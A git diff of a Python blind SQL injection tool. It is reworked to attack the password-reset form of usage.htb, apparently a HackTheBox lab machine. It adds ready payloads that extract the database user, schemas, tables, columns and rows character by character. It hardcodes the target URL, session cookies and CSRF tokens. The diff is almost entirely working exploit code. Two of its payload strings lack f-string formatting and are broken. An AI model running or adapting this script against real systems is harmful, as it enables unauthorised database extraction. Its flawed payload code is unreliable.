@@ -50,20 +50,41 @@ signal.signal(signal.SIGINT, ctrlC)
 
 
 # Global Variables
-main_url = ""
-method = ""
-headers = {}
-post_data = {}
-post_data_exploit = ""
+main_url = "http://usage.htb/forget-password"
+method = "POST"
+headers = {
+    "Cookie": "XSRF-TOKEN=eyJpdiI6InB5Qnd1Y1FGL25xdVJzSFVPVG04SGc9PSIsInZhbHVlIjoiNFA3QUFSd1hWYURxZ0I4WkM2YmRKZEMvWXpUdkt3UUxKUlpnczdaaHhic3ROYThtNm5ERXZ4VDZ5ZUhqaVBDa3ZMeUt3U0EwLzViVzRNM0xhRzRvdXR3V2J6bkZBanpyOFVUazFsQ0NwblQwL0FHS3plamlGK3pPVFM3TGpJZ2oiLCJtYWMiOiIzMjhiMDc3OTAyYzk0NGE0M2RkMDlkNzhhZGIwYjVlNjNkMTZiNDE1ZjUxNDEwZGFkZTBiYzk3MGNjNTUwNGE1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjU2ekl4ejdUT1dsN0w3dUdEU0t4UHc9PSIsInZhbHVlIjoic2JsaUtGSnFuNWZmeElFdEtMLzFxTDlGU08wWVppSmw3MkJWTWgrQ1Z6T0trR2RYbFVFekFzMGJ3WHJILysrVHZoaDUvYS9PWmZiaVBMQnBVRGRQaEVGbzE5VzFTemNYNEVFejBIdFlSdS9YT01PY0FyN01OdzBRNjdsRVNUNGYiLCJtYWMiOiI4YTAzYjdiZGJjM2JjOWE4MjRhMzJkYzk5NjZkMDY4MWM1MWUyMWY4YmIyYmUzNGM0MzRkODkwMjczYTc1ZTBkIiwidGFnIjoiIn0%3D"
+}
+post_data = {
+    "_token": "KNS5mPkU83fcoFpTTJHiQSbWx2Nka9QBWUJK1rLG",
+    "email": "test@gmail.com",
+}
+post_data_exploit = "email"
 get_data = ""
-condition = ""
+condition = "We have e-mailed your password reset link to"
 dbs = []
-1
 
 
 # Functions
-def getUser(label_menu):
-    p2 = log.progress(Color.YELLOW + "User" + Color.END)
+def set_payload(exploit, position, character, db, table):
+    result = ""
+
+    if exploit == "User":
+        result = f"' and (select ascii(substring(user(),{position},1)))='{character}"
+    elif exploit == "DBs":
+        result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
+    elif exploit == "Tables":
+        result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
+    elif exploit == "Columns":
+        result = "' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
+    elif exploit == "Rows":
+        columns = table.concat_columns()
+        result = "' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
+
+    return result
+
+
+def get_info(label_info, label_menu, info_name, db=None, table=None):
     info = ""
     position = 1
     initial_value = post_data[post_data_exploit]
@@ -74,7 +95,9 @@ def getUser(label_menu):
 
         for character in range(33, 126):
 
-            payload = f"{initial_value}' and (select ascii(substring(user(),{position},1)))='{character}"
+            payload = (
+                f"{initial_value}{set_payload(info_name,position,character, db, table)}"
+            )
             post_data[post_data_exploit] = payload
 
             label_menu.status(payload)
@@ -82,7 +105,7 @@ def getUser(label_menu):
 
             if condition in response.text:
                 info += chr(character)
-                p2.status(f"{Color.GREEN}{info}{Color.END}")
+                label_info.status(f"{Color.GREEN}{info}{Color.END}")
                 notFindCharacters = False
                 break
 
@@ -90,35 +113,19 @@ def getUser(label_menu):
         if notFindCharacters:
             break
 
+    return info
 
-def getDBs(label_menu):
-    p2 = log.progress(Color.YELLOW + "DBs" + Color.END)
-    info = "information_schema,performance_schema,"
+
+def get_user(label_menu):
+    label_info = log.progress(Color.YELLOW + "User" + Color.END)
+    get_info(label_info, label_menu, "User")
+
+
+def get_dbs(label_menu):
     global dbs
-    position = 39
-    initial_value = post_data[post_data_exploit]
 
-    while True:
-
-        notFindCharacters = True
-
-        for character in range(33, 126):
-
-            payload = f"{initial_value}' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
-            post_data[post_data_exploit] = payload
-
-            label_menu.status(payload)
-            response = requests.post(main_url, headers=headers, data=post_data)
-
-            if condition in response.text:
-                info += chr(character)
-                p2.status(f"{Color.PURPLE}{info}{Color.END}")
-                notFindCharacters = False
-                break
-
-        position += 1
-        if notFindCharacters:
-            break
+    label_info = log.progress(Color.YELLOW + "DBs" + Color.END)
+    info = get_info(label_info, label_menu, "DBs")
 
     new_dbs = info.split(",")
     for db_name in new_dbs:
@@ -128,36 +135,15 @@ def getDBs(label_menu):
     print("\n")
 
 
-def getTables(label_menu):
+def get_tables(label_menu):
     global dbs
 
     for db in dbs:
 
-        info = ""
-        p2 = log.progress(
+        label_info = log.progress(
             f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
         )
-
-        position = 1
-        while True:
-
-            notFindCharacters = True
-
-            for character in range(33, 126):
-
-                sqli_url = f"{main_url}home' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
-                label_menu.status(sqli_url)
-                response = requests.get(sqli_url, headers=headers)
-
-                if "Welcome to the IMF Administration." in response.text:
-                    info += chr(character)
-                    p2.status(f"{Color.CYAN}{info}{Color.END}")
-                    notFindCharacters = False
-                    break
-
-            position += 1
-            if notFindCharacters:
-                break
+        info = get_info(label_info, label_menu, "Tables", db)
 
         new_tables = info.split(",")
         for table_name in new_tables:
@@ -167,39 +153,17 @@ def getTables(label_menu):
     print("\n")
 
 
-def getColumns(label_menu):
+def get_columns(label_menu):
     global dbs
 
     for db in dbs:
 
         for table in db.tables:
 
-            info = ""
-
-            p2 = log.progress(
+            label_info = log.progress(
                 f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
             )
-
-            position = 1
-            while True:
-
-                notFindCharacters = True
-
-                for character in range(33, 126):
-                    sqli_url = f"{main_url}home' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
-
-                    label_menu.status(sqli_url)
-                    response = requests.get(sqli_url, headers=headers)
-
-                    if "Welcome to the IMF Administration." in response.text:
-                        info += chr(character)
-                        p2.status(info)
-                        notFindCharacters = False
-                        break
-
-                position += 1
-                if notFindCharacters:
-                    break
+            info = get_info(label_info, label_menu, "Columns", db, table)
 
             new_columns = info.split(",")
             for column_name in new_columns:
@@ -208,40 +172,18 @@ def getColumns(label_menu):
     print("\n")
 
 
-def getRows(label_menu):
+def get_rows(label_menu):
     global dbs
 
     for db in dbs:
 
         for table in db.tables:
 
-            info = ""
-            columns = table.concat_columns()
-
-            p2 = log.progress(
+            label_info = log.progress(
                 f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
             )
 
-            position = 1
-            while True:
-
-                notFindCharacters = True
-
-                for character in range(32, 126):
-                    sqli_url = f"{main_url}home' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
-
-                    label_menu.status(sqli_url)
-                    response = requests.get(sqli_url, headers=headers)
-
-                    if "Welcome to the IMF Administration." in response.text:
-                        info += chr(character)
-                        p2.status(info)
-                        notFindCharacters = False
-                        break
-
-                position += 1
-                if notFindCharacters:
-                    break
+            info = get_info(label_info, label_menu, "Rows", db, table)
 
             new_rows = info.split(",")
             for row in new_rows:
@@ -250,7 +192,7 @@ def getRows(label_menu):
     print("\n")
 
 
-def buildFile():
+def build_file():
     global dbs
 
     with open("db.txt", "w") as f:
@@ -271,7 +213,7 @@ def buildFile():
     )
 
 
-def get_rows(answer_size, text):
+def get_input_rows(answer_size, text):
     size = os.get_terminal_size()
     match = re.search(r"columns=(\d+)", str(size))
     columns = int(match.group(1))
@@ -314,7 +256,7 @@ def init_arguments():
         if input_url and ("http://" in input_url or "https://" in input_url):
             main_url = input_url
             label_url.status(input_url)
-            print("\033[A\033[J" * get_rows(33, input_url), end="")
+            print("\033[A\033[J" * get_input_rows(33, input_url), end="")
             break
         else:
             print(f"[{Color.RED}x{Color.END}] Input nor accepted")
@@ -349,7 +291,7 @@ def init_arguments():
                 name, value = input_header.split(":")
                 headers[name] = value
                 label_headers.status(headers)
-                print("\033[A\033[J" * get_rows(61, input_header), end="")
+                print("\033[A\033[J" * get_input_rows(61, input_header), end="")
 
                 follow_condition = input(
                     f"[{Color.BLUE}?{Color.END}] Would you like to add another header? y/n: "
@@ -373,7 +315,7 @@ def init_arguments():
                 name, value = input_data.split(":")
                 post_data[name] = value
                 label_data.status(post_data)
-                print("\033[A\033[J" * get_rows(112, input_data), end="")
+                print("\033[A\033[J" * get_input_rows(112, input_data), end="")
 
                 follow_condition = input(
                     f"[{Color.BLUE}?{Color.END}] Would you like to add another value? y/n: "
@@ -403,7 +345,7 @@ def init_arguments():
             if input_exploit:
                 post_data_exploit = input_exploit
                 label_exploit.status(input_exploit)
-                print("\033[A\033[J" * get_rows(47, input_data), end="")
+                print("\033[A\033[J" * get_input_rows(47, input_data), end="")
                 break
             else:
                 print(f"[{Color.RED}x{Color.END}] Input nor accepted")
@@ -418,7 +360,7 @@ def init_arguments():
         if input_condition:
             condition = input_condition
             label_condition.status(input_condition)
-            print("\033[A\033[J" * get_rows(77, input_data), end="")
+            print("\033[A\033[J" * get_input_rows(77, input_data), end="")
             print("\033[A\033[J", end="")
             break
         else:
@@ -428,19 +370,22 @@ def init_arguments():
 
 
 def main():
-    init_arguments()
+    # init_arguments()
 
     label_menu = log.progress(Color.RED + "Brute Force" + Color.END)
     label_menu.status(" Starting ...")
     print("\n")
     time.sleep(1)
 
-    # getUser(label_menu)
-    # getDBs(label_menu)
-    # getTables(label_menu)
-    # getColumns(label_menu)
-    # getRows(label_menu)
-    # buildFile()
+    db = DB("usage_blog")
+    dbs.append(db)
+
+    # get_user(label_menu)
+    # get_dbs(label_menu)
+    get_tables(label_menu)
+    # get_columns(label_menu)
+    # get_rows(label_menu)
+    # build_file()
 
 
 # Main
